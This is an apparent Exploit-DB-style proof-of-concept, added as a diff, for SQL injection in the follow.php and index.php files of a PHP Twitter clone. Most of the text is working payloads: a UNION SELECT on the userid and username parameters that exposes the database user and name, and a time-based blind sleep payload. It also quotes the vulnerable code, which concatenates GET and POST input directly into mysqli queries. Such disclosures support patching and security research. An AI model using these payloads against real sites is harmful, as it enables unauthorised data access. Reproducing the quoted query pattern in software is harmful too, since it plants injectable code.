@@ -1,0 +1,51 @@
+# Exploit Title: Twitter-Clone 1 - 'userid' SQL Injection
+# Date: 2018-08-21
+# Exploit Author: L0RD
+# Vendor Homepage: https://github.com/Fyffe/PHP-Twitter-Clone/
+# Version: 1
+# CVE: N/A
+# Tested on: Win 10
+
+# POC : SQLi
+# vulnerable files : follow.php , index.php
+# vulnerable parameters : userid , username
+
+# 1) follow.php :
+
+# Parameters : userid , username
+# Type : Union query
+# Type : Time-based blind
+# Payloads :
+
+userid: ' UNION SELECT 1,2,user(),4,database(),6,7%23
+username: ' AND sleep(10)%23
+
+# vulnerable code :
+
+if($_GET['userid']  && $_GET['username']){
+if($_GET['userid']!=$user_id){
+$follow_userid = $_GET['userid'];
+$follow_username = $_GET['username'];
+include 'connect.php';
+$query = mysqli_query($con, "SELECT id
+    FROM following
+WHERE user1_id='$user_id' AND user2_id='$follow_userid'
+");
+
+# 2) index.php :
+
+# vulnerable parameter : username
+# Type : Union query
+# Payload : 
+
+' union select 1,2,user(),4,5,6
+
+# vulnerable code :
+
+if($_POST['login-btn']=="login-submit"){
+if($_POST['username'] != "" && $_POST['password'] != ""){
+$username = strtolower($_POST['username']);
+include "connect.php";
+$query = mysqli_query($con, "SELECT id, password
+FROM users
+ WHERE username='$username'");
